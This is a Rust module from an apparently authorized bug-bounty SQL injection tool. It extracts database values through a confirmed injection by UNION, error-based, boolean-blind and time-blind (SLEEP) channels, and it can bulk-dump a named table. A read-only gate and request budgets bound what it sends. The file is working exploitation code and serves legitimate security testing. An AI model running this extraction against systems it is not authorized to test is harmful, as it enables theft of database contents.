//! Read-only value extraction — bugtools' `getValue` analogue.
//!
//! A confirmed injection that recovers *no value* is, in a bug-bounty triage
//! queue, routinely closed as informative. sqlmap's answer is to read a real
//! value back out through the confirmed channel (`--banner` / `--current-user`
//! / `--current-db`, then `--dump`); this module is that layer, ported onto the
//! adaptive payload path.
//!
//! ## Channels, in sqlmap's reliability order
//! [`ExtractionSession::extract_value`] dispatches **UNION → error → blind**
//! (boolean, then time on the engines where a scalar conditional sleep is
//! clean), returning the first channel that recovers the value. Every channel
//! reuses machinery that already exists in the crate — the leak markers
//! ([`union`]), the dialect error primitives ([`error`]), and the bisection
//! algorithm ([`inference`], which is unit-tested against an in-memory oracle).
//!
//! ## Rails (the honesty/safety charter, made structural)
//! - Every outgoing payload passes [`crate::safety::is_extraction_read_only`]
//!   before it is sent — a non-`SELECT` form is never emitted.
//! - Recovery is bounded by a shared request budget and, for blind, a max
//!   length; a value truncated by the budget is reported *not recovered on this
//!   channel*, never fabricated or returned partial.
//! - Only expressions the [`DialectProfile`] actually knows are asked for
//!   (the caller builds them via [`metadata`]); nothing is guessed.

pub mod dump;
pub mod error;
pub mod inference;
pub mod metadata;
pub mod union;

use crate::adaptive::baseline::BaselineProfile;
use crate::adaptive::signals::{similarity, ResponseView};
use crate::detection::DbmsFamily;
use crate::dialects::{profile, DialectProfile};
use crate::payload::boundary::Boundary;
use crate::safety::{is_extraction_read_only, SafetyVerdict};
use bugtools_core::http::HttpRequest;
use bugtools_http::SafeHttpClient;
use serde::{Deserialize, Serialize};

pub use metadata::{is_dba_expr, proof_expressions, ProofExpr};

/// The channel a value was recovered through.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ExtractionChannel {
    Union,
    Error,
    BooleanBlind,
    TimeBlind,
}

impl ExtractionChannel {
    pub fn label(self) -> &'static str {
        match self {
            Self::Union => "union",
            Self::Error => "error",
            Self::BooleanBlind => "boolean-blind",
            Self::TimeBlind => "time-blind",
        }
    }
}

/// A single recovered value and how much it cost.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExtractedValue {
    pub value: String,
    pub channel: ExtractionChannel,
    pub request_count: usize,
}

/// A labelled recovered fact, as it lands in the serialized result.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExtractedFact {
    pub label: String,
    pub value: String,
    pub channel: String,
    pub requests: usize,
}

/// The descriptor of a confirmed injection the extraction session splices into.
#[derive(Debug, Clone)]
pub struct ConfirmedInjection {
    pub dbms: DbmsFamily,
    pub boundary: Boundary,
    /// Column count that makes a `UNION SELECT` well-formed, once discovered.
    pub union_columns: Option<usize>,
    /// 0-based reflected column that carries an extracted value, once found.
    pub union_position: Option<usize>,
}

/// What a bulk dump should target.
#[derive(Debug, Clone)]
pub struct DumpSpec {
    /// The table to dump; `None` means "no table named" (nothing is dumped —
    /// table discovery is deliberately not automated here).
    pub table: Option<String>,
    pub max_rows: usize,
}

/// How the blind channel was calibrated for this target, cached after the first
/// probe pair so calibration is not repaid per character.
#[derive(Debug, Clone)]
enum BlindMode {
    /// A boolean differential separates true from false responses.
    Boolean { true_hash: String, false_hash: String, true_status: u16, false_status: u16 },
    /// Only a response delay separates them (MySQL-family scalar sleep).
    Time,
    /// Neither channel can answer here.
    Unusable,
}

/// Bounds and dependencies for one confirmed injection's extraction.
pub struct ExtractionSession<'a> {
    client: &'a SafeHttpClient,
    base: &'a HttpRequest,
    parameter: &'a str,
    baseline: &'a BaselineProfile,
    injection: ConfirmedInjection,
    profile: DialectProfile,
    delay_seconds: u32,
    max_requests: usize,
    requests: usize,
}

/// The most `UNION` columns we probe for when the count is not already known.
const UNION_MAX_COLUMNS: usize = 12;

impl<'a> ExtractionSession<'a> {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        client: &'a SafeHttpClient,
        base: &'a HttpRequest,
        parameter: &'a str,
        baseline: &'a BaselineProfile,
        injection: ConfirmedInjection,
        delay_seconds: u32,
        max_requests: usize,
    ) -> Self {
        let profile = profile(injection.dbms);
        Self {
            client,
            base,
            parameter,
            baseline,
            injection,
            profile,
            delay_seconds,
            max_requests,
            requests: 0,
        }
    }

    /// Total extraction requests spent so far.
    pub fn requests(&self) -> usize {
        self.requests
    }

    /// Whether the budget still permits at least one more request.
    fn has_budget(&self) -> bool {
        self.requests < self.max_requests
    }

    /// Send one extraction payload, refusing anything that is not a read-only
    /// `SELECT` and refusing to exceed the request budget.
    async fn send(&mut self, payload: &str) -> Option<ResponseView> {
        if !self.has_budget() {
            return None;
        }
        if !matches!(is_extraction_read_only(payload), SafetyVerdict::Permitted) {
            // A payload that does not pass the read-only gate is never sent.
            return None;
        }
        self.requests += 1;
        crate::adaptive_run::execute(self.client, self.base, Some(payload), self.parameter)
            .await
            .ok()
    }

    /// Recover the value of a scalar `expr` through the first channel that
    /// yields it: UNION, then error, then blind. `None` means no channel
    /// recovered it — reported honestly, never fabricated.
    pub async fn extract_value(&mut self, expr: &str) -> Option<ExtractedValue> {
        if let Some(v) = self.try_union(expr).await {
            return Some(v);
        }
        if let Some(v) = self.try_error(expr).await {
            return Some(v);
        }
        self.try_blind(expr).await
    }

    /// Build and recover the proof set for the confirmed engine (version /
    /// current user / current db / is-dba), skipping any the profile does not
    /// know. Each recovered value is a labelled [`ExtractedFact`].
    pub async fn proof_set(&mut self) -> Vec<ExtractedFact> {
        let mut facts = Vec::new();
        for proof in proof_expressions(&self.profile) {
            if !self.has_budget() {
                break;
            }
            let before = self.requests;
            if let Some(v) = self.extract_value(&proof.expr).await {
                facts.push(ExtractedFact {
                    label: proof.label.to_string(),
                    value: v.value,
                    channel: v.channel.label().to_string(),
                    requests: self.requests - before,
                });
            }
        }
        facts
    }
    // ── UNION channel ──────────────────────────────────────────────────

    /// Ensure a UNION column count + reflected position are known, discovering
    /// them with per-column marker probes when the confirmation did not supply
    /// them. Returns `(columns, position)` or `None` if UNION does not reflect.
    async fn union_shape(&mut self) -> Option<(usize, usize)> {
        if let (Some(c), Some(p)) = (self.injection.union_columns, self.injection.union_position) {
            return Some((c, p));
        }
        let boundary = self.injection.boundary.clone();
        for columns in 1..=UNION_MAX_COLUMNS {
            if !self.has_budget() {
                break;
            }
            let probe = union::build_position_probe(&boundary, columns);
            let view = self.send(&probe).await?;
            if let Some(pos) = union::reflected_position(&view.body, columns) {
                self.injection.union_columns = Some(columns);
                self.injection.union_position = Some(pos);
                return Some((columns, pos));
            }
        }
        None
    }

    async fn try_union(&mut self, expr: &str) -> Option<ExtractedValue> {
        let (columns, position) = self.union_shape().await?;
        let before = self.requests;
        let boundary = self.injection.boundary.clone();
        let payload = union::build_union_payload(&self.profile, &boundary, columns, position, expr);
        let view = self.send(&payload).await?;
        union::slice_marked_value(&view.body).map(|value| ExtractedValue {
            value,
            channel: ExtractionChannel::Union,
            request_count: self.requests - before + 1,
        })
    }

    // ── error channel ──────────────────────────────────────────────────

    async fn try_error(&mut self, expr: &str) -> Option<ExtractedValue> {
        let boundary = self.injection.boundary.clone();
        let payload = error::build_error_payload(self.injection.dbms, &boundary, expr)?;
        let view = self.send(&payload).await?;
        error::parse_error_value(&view.body).map(|value| ExtractedValue {
            value,
            channel: ExtractionChannel::Error,
            request_count: 1,
        })
    }
    // ── blind channel ──────────────────────────────────────────────────

    /// Splice a boolean predicate under the confirmed boundary as an appended
    /// `AND` clause — a real read-only comparison, never a trivial `1=1`.
    fn render_bool(&self, pred: &str) -> String {
        self.injection.boundary.render(&format!(" AND {pred}"))
    }

    /// Calibrate the blind channel against this `expr` with a known-true and a
    /// known-false length comparison (structurally identical to the extraction
    /// predicates, so this is not a `1=1`/`1=2` tell).
    async fn calibrate_blind(&mut self, expr: &str) -> BlindMode {
        let dbms = self.injection.dbms;
        let true_pred = inference::len_gt_predicate(dbms, expr, 0); // nonempty ⇒ true
        let false_pred = inference::len_gt_predicate(dbms, expr, 1_000_000_000); // ⇒ false
        let true_payload = self.render_bool(&true_pred);
        let false_payload = self.render_bool(&false_pred);
        let t = self.send(&true_payload).await;
        let f = self.send(&false_payload).await;
        let (Some(t), Some(f)) = (t, f) else {
            return BlindMode::Unusable;
        };
        let distinguishable = t.status != f.status
            || t.body_len != f.body_len
            || similarity(&t.normalized_hash, &f.normalized_hash) < 0.98;
        if distinguishable {
            return BlindMode::Boolean {
                true_hash: t.normalized_hash,
                false_hash: f.normalized_hash,
                true_status: t.status,
                false_status: f.status,
            };
        }
        // No body/status differential: fall back to timing where a clean scalar
        // conditional sleep exists (MySQL family). Elsewhere, honestly unusable.
        if self.profile.has_delay_primitive()
            && matches!(dbms, DbmsFamily::MySQL | DbmsFamily::MariaDB)
        {
            BlindMode::Time
        } else {
            BlindMode::Unusable
        }
    }

    /// Ask the calibrated blind channel one yes/no question about `pred`.
    async fn blind_answer(&mut self, mode: &BlindMode, pred: &str) -> Option<bool> {
        match mode {
            BlindMode::Unusable => None,
            BlindMode::Boolean { true_hash, false_hash, true_status, false_status } => {
                let payload = self.render_bool(pred);
                let view = self.send(&payload).await?;
                if true_status != false_status {
                    return Some(view.status == *true_status);
                }
                let to_true = similarity(&view.normalized_hash, true_hash);
                let to_false = similarity(&view.normalized_hash, false_hash);
                Some(to_true >= to_false)
            }
            BlindMode::Time => {
                let d = self.delay_seconds.max(1);
                let timed = format!("IF(({pred}),SLEEP({d}),0)");
                let payload = self.render_bool(&timed);
                let view = self.send(&payload).await?;
                Some(view.duration_ms >= self.baseline.timing_threshold_ms())
            }
        }
    }
    /// Binary-search the value length in `[0, max_len]` via the blind channel.
    async fn blind_len(&mut self, mode: &BlindMode, expr: &str, max_len: usize) -> Option<usize> {
        let dbms = self.injection.dbms;
        let (mut lo, mut hi) = (0usize, max_len);
        while lo < hi {
            let mid = (lo + hi) / 2;
            let pred = inference::len_gt_predicate(dbms, expr, mid);
            if self.blind_answer(mode, &pred).await? {
                lo = mid + 1;
            } else {
                hi = mid;
            }
        }
        Some(lo)
    }

    /// Recover one character code by bisection over the Latin-1 charset.
    async fn blind_char(&mut self, mode: &BlindMode, expr: &str, pos: usize) -> Option<u32> {
        let dbms = self.injection.dbms;
        let (mut lo, mut hi) = (0u32, 255u32);
        while lo < hi {
            let mid = (lo + hi) / 2;
            let pred = inference::char_gt_predicate(dbms, expr, pos, mid);
            if self.blind_answer(mode, &pred).await? {
                lo = mid + 1;
            } else {
                hi = mid;
            }
        }
        Some(lo)
    }

    async fn try_blind(&mut self, expr: &str) -> Option<ExtractedValue> {
        if !self.has_budget() {
            return None;
        }
        let before = self.requests;
        let mode = self.calibrate_blind(expr).await;
        let channel = match &mode {
            BlindMode::Boolean { .. } => ExtractionChannel::BooleanBlind,
            BlindMode::Time => ExtractionChannel::TimeBlind,
            BlindMode::Unusable => return None,
        };
        // Budget-bound the length: each character costs ~8 yes/no questions, so
        // never start a recovery the budget cannot finish honestly.
        let remaining = self.max_requests.saturating_sub(self.requests);
        let cap = (remaining / 8).min(inference::DEFAULT_MAX_LENGTH);
        if cap == 0 {
            return None;
        }
        let len = self.blind_len(&mode, expr, cap).await?;
        let mut out = String::new();
        for pos in 1..=len {
            let code = self.blind_char(&mode, expr, pos).await?;
            if let Some(c) = char::from_u32(code) {
                out.push(c);
            }
        }
        Some(ExtractedValue { value: out, channel, request_count: self.requests - before })
    }

    // ── bulk dump ──────────────────────────────────────────────────────

    /// Walk `spec.table` read-only, recovering columns then rows through the
    /// confirmed channel, hard-capped by `spec.max_rows` and the shared budget.
    /// Returns one [`ExtractedFact`] per recovered row plus a `dump` summary
    /// fact; an unsupported engine or an unnamed table yields a single honest
    /// note fact instead.
    pub async fn dump(&mut self, spec: &DumpSpec) -> Vec<ExtractedFact> {
        let Some(table) = spec.table.as_deref() else {
            return vec![note_fact("dump", "no table named (--dump-table required)")];
        };
        let dbms = self.injection.dbms;
        let Some(col_query) = dump::column_list_query(dbms, table) else {
            return vec![note_fact("dump", &format!("no column catalogue for {dbms:?}"))];
        };
        if !dump::supports_row_batch(dbms) {
            return vec![note_fact("dump", &format!("no paginated row aggregate for {dbms:?}"))];
        }
        let Some(col_scalar) = self.extract_value(&col_query).await else {
            return vec![note_fact("dump", "column names not recovered")];
        };
        let columns = dump::parse_columns(&col_scalar.value);
        if columns.is_empty() {
            return vec![note_fact("dump", &format!("no columns found for '{table}'"))];
        }

        let mut facts = Vec::new();
        let mut rows_recovered = 0usize;
        let mut offset = 0usize;
        let batch = 20usize;
        while rows_recovered < spec.max_rows && self.has_budget() {
            let limit = batch.min(spec.max_rows - rows_recovered);
            let Some(query) = dump::row_batch_query(dbms, table, &columns, offset, limit) else {
                break;
            };
            let Some(scalar) = self.extract_value(&query).await else {
                break;
            };
            let rows = dump::parse_rows(&scalar.value, columns.len());
            if rows.is_empty() {
                break;
            }
            let got = rows.len();
            for row in rows.into_iter().take(spec.max_rows - rows_recovered) {
                facts.push(ExtractedFact {
                    label: format!("{table}[{rows_recovered}]"),
                    value: row.join(" | "),
                    channel: scalar.channel.label().to_string(),
                    requests: 0,
                });
                rows_recovered += 1;
            }
            offset += got;
            if got < limit {
                break;
            }
        }
        facts.insert(
            0,
            ExtractedFact {
                label: format!("dump:{table}"),
                value: format!("columns: {}", columns.join(", ")),
                channel: "schema".to_string(),
                requests: self.requests,
            },
        );
        facts
    }
}

/// A single honest note (no value recovered) rendered as an [`ExtractedFact`].
pub fn note_fact(label: &str, msg: &str) -> ExtractedFact {
    ExtractedFact {
        label: label.to_string(),
        value: msg.to_string(),
        channel: "none".to_string(),
        requests: 0,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn channel_labels_are_stable() {
        assert_eq!(ExtractionChannel::Union.label(), "union");
        assert_eq!(ExtractionChannel::Error.label(), "error");
        assert_eq!(ExtractionChannel::BooleanBlind.label(), "boolean-blind");
        assert_eq!(ExtractionChannel::TimeBlind.label(), "time-blind");
    }

    #[test]
    fn extracted_fact_round_trips_through_json() {
        let fact = ExtractedFact {
            label: "version".to_string(),
            value: "8.0.36-MySQL".to_string(),
            channel: "union".to_string(),
            requests: 1,
        };
        let json = serde_json::to_string(&fact).unwrap();
        let back: ExtractedFact = serde_json::from_str(&json).unwrap();
        assert_eq!(fact, back);
    }

    #[test]
    fn note_fact_recovers_no_value() {
        let n = note_fact("dump", "no table named");
        assert_eq!(n.channel, "none");
        assert_eq!(n.requests, 0);
        assert!(n.value.contains("no table"));
    }
}
